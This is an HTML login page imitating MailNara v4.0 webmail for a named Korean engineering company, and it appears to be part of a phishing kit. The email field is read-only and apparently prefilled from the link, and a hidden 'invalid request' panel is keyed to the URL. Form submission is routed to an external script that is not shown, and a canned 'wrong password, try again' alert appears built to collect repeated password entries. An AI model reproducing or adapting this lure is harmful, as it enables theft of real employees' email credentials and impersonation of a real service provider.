<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
   <title>MAILNARA v4.0 ::: (주)피스코엔지니어링</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body style="background-color: #fafafa; max-width: 1366px; min-width: 320px; margin: 0 auto; color: #555555; font-size: 13px;">
    <div class="mt-32 mx-auto hidden" style="max-width: 492px;" id="invalid-url">
       <!-- Header Section with Logo -->
        <div class="bg-slate-700 flex items-center justify-between px-4 py-3 mb-0">
            <!-- Left Side - Logo -->
            <div class="flex items-center space-x-3">
                <img src="assets/img/logo.png" alt="" class="w-[100px] h-[29px]">
               
            </div>
            
            <!-- Right Side - Korean Text -->
            <div class="text-white text-sm">
                (주)피스코엔지니어링
            </div>
           
        </div>
        <!-- Banner-->
        <div>
                <img src="assets/img/main.jpg" alt="" class="h-[258px]">
        </div>
        <!-- 2 Tabs -->
        <div class="flex mt-2">
            <!-- 사용자 Tab - Active -->
            <div class="flex-1 bg-[#66b7d9] text-white text-center py-3 font-bold text-sm cursor-pointer transition-colors">
                사용자
            </div>
            <!-- 관리자 Tab - Inactive -->
            <div class="flex-1 bg-[#0000000f] text-gray-700 text-center py-3 font-medium text-sm cursor-pointer transition-colors">
                관리자
            </div>
        </div>
      <h2 class="text-red-700 text-2xl text-center">Invalid Request!</h2>
       <!-- 2 buttons -->
      <div class="flex gap-2 mt-4 mb-2">
          <!-- 아웃룩 설정방법 Button -->
          <button type="button" 
                  class="flex-1 bg-[#EAEAEA] hover:bg-gray-400 text-[#555555] font-medium py-3 px-4 text-sm transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2">
              아웃룩 설정방법
          </button>
          
          <!-- 아웃룩 자동세팅 Button -->
          <button type="button" 
                  class="flex-1 bg-[#EAEAEA] hover:bg-gray-400 text-[#555555] font-medium py-3 px-4 text-sm transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2">
              아웃룩 자동세팅
          </button>
      </div>
      <!-- alert button -->
      <div class="mt-4 border-2 border-[#FCA5A5] rounded p-2">
          <div class="flex items-center justify-center">
              <!-- Warning Icon -->
              <svg class="w-5 h-5 text-red-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                  <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
              </svg>
              <!-- Error Message -->
              <span class="text-red-600 text-sm font-medium">
                  인증서 오류 발생 시 차단 방법
              </span>
          </div>
      </div>
      <!-- footer -->
      <div class="mt-8 text-center text-gray-500 text-sm mb-4" style="border-top: 1px solid #e7e7e7; padding-top: 16px;">
          Copyright © <span class="text-blue-500 font-medium">MailNara</span> All rights reserved.
      </div>
    </div>
    <div id="login-form" class="mt-32 mx-auto" style="max-width: 492px;">
        
        <!-- Header Section with Logo -->
        <div class="bg-slate-700 flex items-center justify-between px-4 py-3 mb-0">
            <!-- Left Side - Logo -->
            <div class="flex items-center space-x-3">
                <img src="assets/img/logo.png" alt="" class="w-[100px] h-[29px]">
               
            </div>
            
            <!-- Right Side - Korean Text -->
            <div class="text-white text-sm">
                (주)피스코엔지니어링
            </div>
           
        </div>
        <!-- Banner-->
        <div>
                <img src="assets/img/main.jpg" alt="" class="h-[258px]">
        </div>
        <!-- 2 Tabs -->
        <div class="flex mt-2">
            <!-- 사용자 Tab - Active -->
            <div class="flex-1 bg-[#66b7d9] text-white text-center py-3 font-bold text-sm cursor-pointer transition-colors">
                사용자
            </div>
            <!-- 관리자 Tab - Inactive -->
            <div class="flex-1 bg-[#0000000f] text-gray-700 text-center py-3 font-medium text-sm cursor-pointer transition-colors">
                관리자
            </div>
        </div>
      <!-- Input and submit btn -->
      <div class="bg-white p-6">
          <!-- Remember ID Checkbox -->
          <div class="flex items-center justify-center mb-4">
              <input type="checkbox" 
                     id="remember-id" 
                     name="remember_id"
                     class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded mr-2">
              <label for="remember-id" class="text-sm text-gray-700 font-semibold">
                  아이디 저장
              </label>
          </div>
          
          <!-- Login Form -->
          <form method="POST" action="#" class="space-y-4" onsubmit="return false;">
              
              <!-- Username Field -->
              <div class="flex items-center">
                  <label for="email" class="w-16 text-sm font-semibold text-gray-700 mr-4">
                      아이디
                  </label>
                  <input type="text" 
                         id="email" 
                         name="email"
                         placeholder="이메일을 입력하세요"
                         required readonly
                         class="flex-1 px-1 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 text-sm">
              </div>
              
              <!-- Password Field -->
              <div class="flex items-center">
                  <label for="password" class="w-16 text-sm font-semibold text-gray-700 mr-4">
                      비밀번호
                  </label>
                  <input type="password" 
                         id="password" 
                         name="password"
                         placeholder="비밀번호를 입력하세요"
                         required
                         autofocus
                         class="flex-1 px-1 py-2 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 text-sm">
              </div>
              
              <!-- Login Button -->
              <button type="submit" 
                      class="w-full bg-[#66b7d9] hover:bg-[#5aa5c7] text-white font-medium py-3 px-4 rounded transition duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 text-sm">
                  로그인
              </button>
              
          </form>
      </div>
      <!-- 2 buttons -->
      <div class="flex gap-2 mt-4 mb-2">
          <!-- 아웃룩 설정방법 Button -->
          <button type="button" 
                  class="flex-1 bg-[#EAEAEA] hover:bg-gray-400 text-[#555555] font-medium py-3 px-4 text-sm transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2">
              아웃룩 설정방법
          </button>
          
          <!-- 아웃룩 자동세팅 Button -->
          <button type="button" 
                  class="flex-1 bg-[#EAEAEA] hover:bg-gray-400 text-[#555555] font-medium py-3 px-4 text-sm transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2">
              아웃룩 자동세팅
          </button>
      </div>
      <!-- alert button -->
      <div class="mt-4 border-2 border-[#FCA5A5] rounded p-2">
          <div class="flex items-center justify-center">
              <!-- Warning Icon -->
              <svg class="w-5 h-5 text-red-500 mr-2" fill="currentColor" viewBox="0 0 20 20">
                  <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
              </svg>
              <!-- Error Message -->
              <span class="text-red-600 text-sm font-medium">
                  인증서 오류 발생 시 차단 방법
              </span>
          </div>
      </div>
      <!-- footer -->
      <div class="mt-8 text-center text-gray-500 text-sm mb-4" style="border-top: 1px solid #e7e7e7; padding-top: 16px;">
          Copyright © <span class="text-blue-500 font-medium">MailNara</span> All rights reserved.
      </div>
       
    </div>
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/app.js"></script>
    <div id="custom-alert" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
      <div class="bg-white text-black p-9 rounded-xl w-[90%] max-w-md text-sm border-4 border-[#71B0CD]">
        <div class="mb-4">
          <p class="font-semibold">
            잘못된 비밀번호입니다!
          </p>
        </div>
        <div class="text-center">
          <button id="alert-ok"
                  class="bg-[#989EAA] text-white px-6 py-1 rounded-sm font-bold text-[12px]">
            다시 시도하세요! 
          </button>
        </div>
      </div>
    </div>
</body>
</html>
